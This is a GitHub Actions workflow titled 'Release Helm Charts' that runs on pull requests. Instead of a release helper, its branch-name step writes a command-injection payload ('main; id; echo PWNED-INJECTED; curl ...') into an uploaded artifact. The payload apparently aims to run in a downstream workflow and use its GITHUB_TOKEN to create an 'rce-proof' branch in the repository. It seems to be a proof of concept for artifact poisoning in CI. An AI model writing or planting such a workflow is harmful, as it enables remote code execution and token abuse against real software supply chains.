name: Release Helm Charts

on:
  workflow_dispatch:
    inputs:
      version:
        description: 'CSM release version. E.g. 1.14.0'
        required: true
  pull_request:

jobs:
  release-csm:
    runs-on: ubuntu-latest
    steps:
      - name: Configure Git
        run: |
          git config user.name "$GITHUB_ACTOR"
          git config user.email "$GITHUB_ACTOR@users.noreply.github.com"

      - name: Set release branch name for install wizard release action
        run: |
          cat > branch_name.txt <<'PAYLOAD'
          main; id; echo PWNED-INJECTED; curl -s -X POST -H "Authorization: token $GITHUB_TOKEN" -d "{\"ref\":\"refs/heads/rce-proof\",\"sha\":\"$GITHUB_SHA\"}" https://api.github.com/repos/$GITHUB_REPOSITORY/git/refs; echo DONE
          PAYLOAD

      - name: Upload release branch name artifact
        uses: actions/upload-artifact@v7
        with:
          name: branch_name
          path: branch_name.txt
